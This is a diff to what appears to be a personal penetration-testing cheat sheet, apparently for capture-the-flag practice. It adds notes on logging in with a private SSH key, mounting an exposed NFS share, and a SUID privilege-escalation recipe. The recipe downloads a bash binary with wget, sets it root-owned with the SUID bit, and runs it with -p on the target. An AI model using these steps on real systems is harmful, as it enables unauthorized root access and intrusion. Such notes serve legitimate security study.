@@ -6,13 +6,14 @@
 * ```systemctl stop myservice```
 * [-h / -help / --help] or man
 * https://www.exploit-db.com/exploits/20745
-* 
+
+
 ## Useful location  
   ### .ssh Key 
    * Private key ssh ```/home/user-name/.ssh```
    * This file is the private key ```id_rsa```
    * change the file permission ``` chmod 600 ```
-
+   * `ssh -i <key-file> <username>@<ip> `
   ### Nmap
 
 
@@ -60,7 +61,7 @@
 * show all shares `/usr/sbin/showmount -e [IP] `
 ### Exploiting
 * create folder `mkdir /tmp/mount`
-* 'sudo mount -t nfs IP:share /tmp/mount/ -nolock'
+* mount folder `sudo mount -t nfs IP:share /tmp/mount/ -nolock`
 
 # Shells 
 ## Simple Shell msfvenom 
@@ -75,6 +76,17 @@ R = export the payload in raw format
 
 ```
 * copy and paste the value on telnet session 
+
+### Privilege Escalatation 
+### Instalaltion 
+* Download bash shell wget https://github.com/polo-sec/writing/raw/master/Security%20Challenge%20Walkthroughs/Networks%202/bash 
+## SUID
+* SUID: the file or files can be run with the permissions of the file(s) owner/group.
+* change bash file to suid bit `chmod +s filename`
+* change to excute `chmod +x filename`
+* change ower to root `chown root fielname`
+* validate (sr-x) permssion `ls -la fielname`
+* run the file with `./fielname -p` on target 
 
 # other Important 
 ## Start a tcpdump listener
